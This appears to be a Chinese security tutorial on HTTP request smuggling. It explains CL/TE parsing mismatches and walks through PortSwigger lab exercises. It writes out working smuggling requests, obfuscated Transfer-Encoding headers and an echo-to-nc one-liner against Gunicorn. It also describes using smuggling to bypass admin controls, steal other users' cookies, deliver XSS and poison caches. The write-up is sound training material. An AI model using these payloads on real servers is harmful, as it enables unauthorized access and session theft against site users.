# 什么是 HTTP 请求走私？

不同服务器请求内容的标准不同，对同一段tcp内容，前后端服务器获取到的http请求内容会有一定差异，而这个差异就造成了HTTP请求走私。

## 漏洞成因

 **HTTP规范提供了两种不同的方法来指定请求的结束位置** ：Content-Length标头和Transfer-Encoding标头，若同一请求前端与后端所使用的规范不同就可能导致解析差异，从而造成请求走私。一般服务器有三种解析方式：

    
    
    CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。
    TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。
    TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。
    

**这里的解析错误主要取决于HTTP1.1中的两个特性：** keep-alive与pipeline

 **Keep-Alive** :是在 HTTP 请求中增加一个特殊的请求头 Connection: Keep-Alive，告诉服务器，接收完这次 HTTP
请求后，不要关闭 TCP 链接，后面对相同目标服务器的 HTTP 请求，重用这一个 TCP 链接，这样只需要进行一次 TCP
握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在 HTTP1.1 中是默认开启的。

 **Pipeline(http管线化)**
：http管线化是一项实现了多个http请求但不需要等待响应就能够写进同一个socket的技术，仅有http1.1规范支持http管线化。在这里，客户端可以像
**流水线**
一样发送自己的`HTTP`请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。

 **正常HTTP请求：**

![wKg0C2Lt3vGAWA5mAABSJE8j9I266.png](https://image.3001.net/images/20220926/1664172482_633141c2d3589222385ff.png!small)

 **若前置服务器和后端服务器在 HTTP 请求的边界划分上未达成一致：**

![wKg0C2Lt3wiASPgZAABXFatgrBs013.png](https://image.3001.net/images/20220926/1664172483_633141c35017af3661a0f.png!small)  
当我们向代理服务器发送一个比较模糊的 HTTP 请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个 HTTP
请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了
HTTP 走私攻击。

## HTTP 流水线

 **上边写到Pipeline(http管线)可以像流水线一样发送http请求，所以这里简单了解下HTTP流水线原理**

 **执** 行nc xxx.xxx.xxx.xxx 80,然后发送三个HTTP请求。

    
    
    GET / HTTP/1.1
    Host: localhost
    GET / HTTP/1.1
    Host: localhost
    GET / HTTP/1.1
    Host: localhost
    

**在一个连接中发送3个HTTP请求，服务器会按序响应3个HTTP请求。可以使用这种办法来最小化请求之间的间隔时间。但由于手工录入可能较慢，可能无法实现我们的意图，所以也可以用命令来代替。**

    
    
    echo -ne "GET / HTTP/1.1\r\nHost: localhost\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc xxx.xxx.xxx.xxx 80
    

**这里就可以结合请求走私，执行一些我们想要执行的操作。**

## 五种攻击方式

### CL不为0

所有不携带请求体的HTTP请求都有可能受此影响。前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理。这就有可能导致请求走私。

 **代码实例：**

    
    
    GET / HTTP/1.1
    Host: Sentiment.com
    Content-Length: 44
    
    GET / secret HTTP/1.1
    Host: Sentiment.com
    
    

**这里要提一下长度的计算规则:**

> Content-Length 需要将请求主体中的 \r\n 所占的 2 字节计算在内，而块长度要忽略块内容末尾表示终止的 \r\n；
>
> 请求头与请求主体之间有一个空行，是规范要求的结构，并不计入 Content-Length。

所以这里的44=21+19+2*2(这两行后边的换行,即：(`\r\n`)

![wKg0C2Lt32GALABlAAAcR0oZdPQ276.png](https://image.3001.net/images/20220926/1664172483_633141c3c2ea77682ccc1.png!small)

 **攻击流程**

前端：收到该请求，读取Content-Length，判断这是一个完整的请求。 后端：因为它不对Content-Length进行处理，由于Pipeline的存在，后端服务器就认为这是收到了两个请求，分别是：

 **第一个：**

    
    
    GET / HTTP/1.1
    Host: Sentiment.com
    

**第二个：**

    
    
    GET / secret HTTP/1.1
    Host: Sentiment.com
    

### CL-CL

 **RFC7230规范**

在RFC7230中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。

有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。  
但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。

 **代码实例：**

    
    
    GET / HTTP/1.1
    Host: Sentiment.com
    Content-Length: 8
    Content-Length: 7
    
    12345
    **a**

 **攻击流程：**

 **前端：**`Content-Length: 8`判断为正常请求，发送给后端

 **后端：**`Content-Length: 7`读取长度为7，剩下一个字母`a`，会留在缓冲区，等待下一次请求时，加到下个请求中

 **此时如果又来一个请求：**

    
    
    GET / HTTP/1.1
    Host: localhost
    

**拼接好缓冲区的**`a`后，就变成了：

    
    
    aGET / HTTP/1.1
    Host: localhost
    

此时就会报错，这样就实现了一次HTTP走私攻击，对正常的用户请求造成了影响，而且还可以扩展成类似于CSRF的攻击方式。

### CL-TE

前置服务器认为Content-Length优先级更高 ，后端认为Transfer-Encoding优先级更高。

 **RFC2616规范**

如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length。

 **chunked**

设置了Transfer-Encoding: chunked后，请求主体按一系列块的形式发送，并将省略Content-Length。在每个块的开头需要用十六进制数指明当前块的长度，数值后接\r\n（占 2 字节），然后是块的内容，再接\r\n表示此块结束。最后用长度为 0
的块表示终止块。终止块后是一个 trailer，由 0 或多个实体头组成，可以用来存放对数据的数字签名等。

    
    
    [chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]
    

**代码实例**

    
    
    POST / HTTP/1.1
    Host: Sentiment.com
    Content-Length: 6
    Transfer-Encoding: chunked
    
    0
    
    a
    

**攻击流程**

前端：Content-Length: 6,判断完整，传给后端。

后端：Transfer-Encoding遇到0\r\n\r\n后，以为请求体结束，留下了一个字母a在下一次请求时，会附着在下个请求中。

 **此时再有用户请求：**

    
    
    GET / HTTP/1.1
    Host: localhost
    

**就会返回错误内容造成服务器解析异常**

    
    
    aGET / HTTP/1.1
    **Host: localhost**

 **实验**

> [https://portswigger.net/web-security/request-smuggling/lab-basic-cl-> te](https://www.sec-in.com/outLinkPage/?target=https://portswigger.net/web-> security/request-smuggling/lab-basic-cl-te)

 **改为POST传参后加上如下三行，传参两次，第二次服务器解析异常。**

![wKg0C2Lt34yAY2BAADeGuShxJg765.png](https://image.3001.net/images/20220926/1664172484_633141c434d62350bf004.png!small)

### TE-CL

前置服务器认为Transfer-Encoding优先级更高，后端认为Content-Length优先级更高。

 **代码实例**

注意下边有两个换行，为了让Transfer-Encoding成功解析

    
    
    POST / HTTP/1.1
    Host: ac411f671fba83e5c0f33998003c00b9.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 4
    Transfer-Encoding: chunked
    
    12
    GPOST / HTTP/1.1
    0
    

**攻击流程**

前端： 读取到0\r\n\r\n后，Transfer-Encoding认为是一个完整请求， 传给后端；

后端：Content-Length: 4，判断到12\r\n，不在解析，后边的内容会留给下个请求。

    
    
    GET / HTTP/1.1
    Host: localhost
    

**拼接预留内容解析错误：**

    
    
    GPOST / HTTP/1.1
    
    0
    
    GET / HTTP/1.1
    Host: localhost
    

**实验**

> [https://portswigger.net/web-security/request-smuggling/lab-basic-te-> cl](https://www.sec-in.com/outLinkPage/?target=https://portswigger.net/web-> security/request-smuggling/lab-basic-te-cl)

 **传参两次，第二次服务器解析异常：**

![wKg0C2Lt35qAexmjAADc9rMJC90898.png](https://image.3001.net/images/20220926/1664172485_633141c5428710f3c0fc5.png!small)

 **此外也可以构造404。**

![wKg0C2Lt36KAVP6AADkv1kb6lQ061.png](https://image.3001.net/images/20220926/1664172485_633141c5bf8f1a69a2528.png!small)

### TE-TE

前置和后端服务器都支持Transfer-Encoding，所以就没有优先级的问题了，但可以通过混淆让它们在处理时产生分歧，其实也就是变成了 CL-TE 或
TE-CL。

 **代码实例**

对Transfer-encoding进行大小写混淆，使服务器不处理他的操作，进而执行Content-Length

    
    
    POST / HTTP/1.1
    Host: acbd1feb1fb1b40ec0210aa3000090.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 4
    Transfer-Encoding: chunked
    Transfer-encoding: Sentiment
    
    5c
    aPOST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10
    x=1
    0
    

**攻击流程**

前端：服务器读取到0\r\n\r\n,认为请求完整，传给后端；

后端：由于构造了大小写混淆，会直接回退到Content-Length: 4，读取到5c\r\n截止，后边的内容会带到下次请求。

 **混淆payload**

 **PortSwigger 中还给出了很多混淆payload：**

    
    
    Transfer-Encoding: xchunked
    
    Transfer-Encoding[空格]: chunked
    
    Transfer-Encoding: chunked
    Transfer-Encoding: x
    
    Transfer-Encoding:[tab]chunked
    
    [空格]Transfer-Encoding: chunked
    
    X: X[\n]Transfer-Encoding: chunked
    
    Transfer-Encoding
    : chunked
    

### 实验

> [https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-> header](https://www.sec-> in.com/outLinkPage/?target=https://portswigger.net/web-security/request-> smuggling/lab-obfuscating-te-header)

![wKg0C2Lt362AbdUdAADjMSkewCg755.png](https://image.3001.net/images/20220926/1664172486_633141c63d797f611a7a1.png!small)

## 漏洞利用

### 请求走私绕过前端安全控制CL-TE 漏洞

在某些应用程序中，前端Web服务器用于实现某些安全控制，以决定是否允许处理单个请求。允许的请求将转发到后端服务器，在该服务器中，它们被视为已通过前端控件传递。

> [https://portswigger.net/web-security/request-smuggling/exploiting/lab-> bypass-front-end-controls-cl-te](https://www.sec-> in.com/outLinkPage/?target=https://portswigger.net/web-security/request-> smuggling/exploiting/lab-bypass-front-end-controls-cl-te)

本实验当前用户被允许访问根目录/但不允许/admin。他们可以使用以下请求走私攻击来绕过此限制：

![wKg0C2Lt37aAGbjvAAE0p7iTDNQ245.png](https://image.3001.net/images/20220926/1664172486_633141c6b378b65d6e954.png!small)

由于/admin没有使用对的标头，请求被拒绝。加上Host: localhost重新构造：

![wKg0C2Lt372Acd0lAAEdQZx8KBU479.png](https://image.3001.net/images/20220926/1664172487_633141c745d704608754e.png!small)

访问/admin/delete?username=carlos两次，第二次发现删除成功自动跳转到/admin

![wKg0C2Lt38SAYwWWAADhJVtTYFE206.png](https://image.3001.net/images/20220926/1664172487_633141c7dc08d6cb7d667.png!small)

### 请求走私揭示前端请求重写

前端代理服务器在接收到请求后不会直接将请求转发给后端服务器，而是先添加一些必要的字段然后转发给后端服务器。如果不能获取到前端代理服务器添加或重写的字段，那么我们走私的请求就无法被后端服务器处理。

 **如何获取这些值，这里有一个简单的方法：**

> 找一个能够将请求参数的值输出到响应中的POST请求；
>
> 把该POST请求中，找到的这个特殊的参数放在消息的最后面；
>
> 然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。
>
> [https://portswigger.net/web-security/request-smuggling/exploiting/lab-> reveal-front-end-request-rewriting](https://www.sec-> in.com/outLinkPage/?target=https://portswigger.net/web-security/request-> smuggling/exploiting/lab-reveal-front-end-request-rewriting)

输入框随便输入个值，抓包，构造HTTP走私请求发包。

![wKg0C2MoKiGAEXDzAAIsy0mwUdc436.png](https://image.3001.net/images/20220926/1664172488_633141c85f954fe05efd7.png!small)

这里的100：走私请求数据包中Content-length:
100，显然自身携带数据没有达到这个数目。:因而后端服务器会在收到第一个走私请求时会误以为该请求还没有结束，将不断接受新传来的HTTP请求直到长度达到100。因此添加在search=test后的HTTP请求也成POST请求的一部分，最终将前端服务器添加的HTTP头显示在页面。

 **将HTTP头加到走私请求中：**

![wKg0C2Lt38yAF8Y5AAD82T5LGRs073.png](https://image.3001.net/images/20220926/1664172488_633141c8f009ba715672c.png!small)

 **将ip改为127.0.0.1。**

![wKg0C2Lt39GANNzbAADfotXxPpM672.png](https://image.3001.net/images/20220926/1664172489_633141c9872a0e23a03cd.png!small)

 **构造用户删除请求。**

![wKg0C2Lt39iABt9NAACrxwvcuVM019.png](https://image.3001.net/images/20220926/1664172490_633141ca1293fa0e5b7d9.png!small)

### 请求走私捕获用户请求

要进行攻击，您需要走私一个将数据提交到存储功能的请求，其参数包含位于请求最后的数据。后端服务器处理的下一个请求将附加到走私请求上，结果将存储另一个用户的原始请求。

> [https://portswigger.net/web-security/request-smuggling/exploiting/lab-> capture-other-users-requests](https://www.sec-> in.com/outLinkPage/?target=https://portswigger.net/web-security/request-> smuggling/exploiting/lab-capture-other-users-requests)

访问博客文章并发表评论。将comment-post请求发送到Burp Repeater，将comment参数放在最后，并确保它仍然有效。将comment-post请求Content-Length增加到600，然后将其走私到后端服务器，构造数据包：

![wKg0C2Lt3eAP0mfAAC5rSmEXy8946.png](https://image.3001.net/images/20220926/1664172490_633141ca97a7532cbc227.png!small)

之后就是一个漫长的过程，一直调整cl长度，发起请求，最后得到了用户的Cookie及指纹信息.

![wKg0C2Lt3OAeUaKAADurIAt0ho578.png](https://image.3001.net/images/20220926/1664172491_633141cb200b47b6a9844.png!small)

 **拿到指纹和Cookie信息后，便可利用对方身份进行请求(这里虽然返回Invalid CSRF token),但靶场顺利通过了~~~**

![wKg0C2Lt3uABDYfAADUBmKyTrA883.png](https://image.3001.net/images/20220926/1664172491_633141cb9cedbec07dd2a.png!small)

![wKg0C2Lt4ACALlBcAACHQWFjMX0970.png](https://image.3001.net/images/20220926/1664172492_633141cc3987522cb2998.png!small)

### 请求走私利用反射 XSS

 **该利用方式优点：**

> 它不需要与受害者用户进行交互。您不需要向他们提供URL，也不必等待他们访问它。您只是走私了包含XSS有效负载的请求，后端服务器将处理下一个用户的请求；
>
> 它可以用于在请求的某些部分中利用XSS行为，而这些部分在正常的反射XSS攻击中是无法轻松控制的，例如HTTP请求标头。
>
> [https://portswigger.net/web-security/request-smuggling/exploiting/lab-> deliver-reflected-xss](https://www.sec-> in.com/outLinkPage/?target=https://portswigger.net/web-security/request-> smuggling/exploiting/lab-deliver-reflected-xss)

先抓包写个xss,看下具体位置及闭合方式，这里需要用">进行闭合。

![wKg0C2Lt4AqAI6TyAAEeYGOo21w702.png](https://image.3001.net/images/20220926/1664172492_633141cca763287cac6fc.png!small)

 **构造xss。**

![wKg0C2Lt4BKAPZiIAAETZHbd4I467.png](https://image.3001.net/images/20220926/1664172493_633141cd6310084bf2749.png!small)

 **此时在访问成功触发。**

![wKg0C2Lt4BmAZjtlAACIcwEWX1E909.png](https://image.3001.net/images/20220926/1664172493_633141cde40551c46c730.png!small)

### 请求走私执行 Web 缓存投毒

如果前端基础架构的任何部分执行内容缓存（通常出于性能原因），则可能会使用场外重定向响应来毒化缓存。这将使攻击持续存在，从而影响随后请求受影响URL的所有用户。

> [https://portswigger.net/web-security/request-smuggling/exploiting/lab-> perform-web-cache-poisoning](https://www.sec-> in.com/outLinkPage/?target=https://portswigger.net/web-security/request-> smuggling/exploiting/lab-perform-web-cache-poisoning)

实验环境中提供了漏洞利用的辅助服务器。选择/resources/js/tracking.js进行投毒，进行以下设置：

![wKg0C2Lt4DuAEJzIAABmfoSli0w315.png](https://image.3001.net/images/20220926/1664172494_633141ce60e1ac43a0a34.png!small)

 **使用漏洞利用服务器的主机名启动的攻击，以毒化服务器缓存，构造数据包：**

![wKg0C2Lt4EWAdq7xAAE6ryr8by0923.png](https://image.3001.net/images/20220926/1664172495_633141cf142f1c5d337e0.png!small)

 **访问/resources/js/tracking.js发生跳转。**

![wKg0C2Lt4EuALQJRAADFs1CXIk025.png](https://image.3001.net/images/20220926/1664172495_633141cfc18bd50893efb.png!small)

 **之后访问服务器主页出现弹窗**

漏洞利用方式先做到这里，以上的方式其实都是针对于HTTP/1.1的，如果换成HTTP/2.0就基本都不行了，所以如果需要的话还需要继续进行HTTP/2.0的利用学习。

可参考:[高级请求走私|网络安全学院 (portswigger.net)](https://www.sec-in.com/outLinkPage/?target=https://portswigger.net/web-security/request-smuggling/advanced)

## Gunicorn 20.0.4 请求走私

当代理使用Haproxy，服务器用的是Gunicorn并且版本高于20.0时，就有了这种新的利用方式。它是由对标头的特殊解析引起的。Sec-Websocket-Key1

 **当我们传入一段这样的请求**

    
    
    GET / HTTP/1.1
    Host: localhost
    Content-Length: 68
    Sec-Websocket-Key1: x
    
    xxxxxxxxGET /admin HTTP/1.1
    Host: localhost
    Content-Length: 35
    
    GET / HTTP/1.1
    Host: localhost
    
    

**Haproxy 将看到以下两个请求：**

    
    
    GET / HTTP/1.1
    Host: localhost
    Content-Length: 68
    Sec-Websocket-Key1: x
    
    xxxxxxxxGET /admin HTTP/1.1
    Host: localhost
    Content-Length: 35
    
    
    
    GET / HTTP/1.1
    Host: localhost
    
    

**而 gunicorn 将看到以下两个不同的请求：**

    
    
    GET / HTTP/1.1
    Host: localhost
    Content-Length: 68
    Sec-Websocket-Key1: x
    
    xxxxxxxx
    
    
    
    GET /admin HTTP/1.1
    Host: localhost
    Content-Length: 35
    
    GET / HTTP/1.1
    Host: localhost
    
    

**这样就造成了请求走私漏洞。**

同时我们可以使用命令发送上述请求：echo -en "GET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 68\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET /admin
HTTP/1.1\r\nHost: localhost\r\nContent-Length: 35\r\n\r\nGET /
HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc localhost 8080

